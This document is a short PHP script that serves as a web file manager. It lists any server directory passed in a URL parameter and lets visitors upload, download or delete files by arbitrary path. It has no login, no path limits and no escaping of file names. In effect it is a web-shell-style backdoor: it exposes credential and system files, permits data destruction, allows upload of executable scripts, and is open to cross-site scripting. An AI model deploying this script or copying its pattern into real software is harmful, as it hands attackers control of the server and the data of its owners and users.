<?php
$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();

if (!$dir || !is_dir($dir)) {
    die("Invalid directory.");
}

// File Upload Handler
if (isset($_FILES['file'])) {
    $target = $dir . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        echo "<p style='color:green;'>Uploaded successfully!</p>";
    } else {
        echo "<p style='color:red;'>Upload failed.</p>";
    }
}

// File Download Handler
if (isset($_GET['download']) && is_file($_GET['download'])) {
    $file = $_GET['download'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    readfile($file);
    exit;
}

// File Delete Handler
if (isset($_GET['delete']) && is_file($_GET['delete'])) {
    unlink($_GET['delete']);
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

// Directory Listing
$items = scandir($dir);
echo "<h2>Browsing: $dir</h2>";
echo "<form method='POST' enctype='multipart/form-data'>";
echo "Upload File: <input type='file' name='file'>";
echo "<input type='submit' value='Upload'>";
echo "</form><br>";

echo "<ul>";

if ($dir != '/') {
    $parent = dirname($dir);
    echo "<li><a href='?dir=" . urlencode($parent) . "'>[.. Parent]</a></li>";
}

foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;

    $path = $dir . DIRECTORY_SEPARATOR . $item;
    $urlPath = urlencode($path);

    if (is_dir($path)) {
        echo "<li><a href='?dir=$urlPath'>[DIR] $item</a></li>";
    } else {
        echo "<li>$item - 
            <a href='?download=$urlPath'>[Download]</a> | 
            <a href='?delete=$urlPath' onclick=\"return confirm('Delete this file?');\">[Delete]</a>
        </li>";
    }
}
echo "</ul>";
?>
